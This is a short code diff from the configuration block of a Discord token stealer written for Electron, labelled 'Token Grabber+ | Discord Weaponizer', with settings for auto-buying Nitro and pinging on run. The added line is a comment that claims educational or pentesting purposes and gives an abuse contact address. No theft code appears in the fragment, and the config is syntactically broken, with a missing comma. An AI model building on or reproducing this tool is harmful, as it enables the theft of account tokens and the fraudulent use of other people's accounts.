@@ -8,8 +8,8 @@ const { BrowserWindow, session } = require("electron");
 const config = {
   auto_buy_nitro: changemeplease,
   ping_on_run: true,
-  ping_val: "@here",
-  stringspy: "~~stringspy~~"
+  ping_val: "@here", 
+  stringspy: "~~stringspy~~" // This code is made for educational purposes / pentesting. if you see this, that was probably not what it was used for. Send me this string at abuse@cynthialabs.net - Thanks
   embed_name: "Token Grabber+ | Discord Weaponizer",
   embed_icon:
     "https://cdn.discordapp.com/avatars/928619303257923635/2101f61a8d6b468698893cb0d8677a15.webp",
